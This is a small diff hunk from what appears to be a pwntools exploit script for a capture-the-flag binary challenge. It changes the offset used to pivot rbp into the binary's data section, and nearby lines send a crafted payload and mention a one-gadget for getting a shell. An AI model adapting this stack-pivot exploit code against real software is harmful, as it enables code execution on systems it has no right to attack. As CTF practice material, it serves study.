@@ -28,7 +28,7 @@ payload += p64(elf.bss()) * 3
 c.sendlineafter(":", payload)
 
 # set rbp to symbol[data]
-new_rbp = elf.symbols['data'] + 0x600
+new_rbp = elf.symbols['data'] + 0x2000
 print("new_rbp: " + hex(new_rbp))
 
 # one gadget
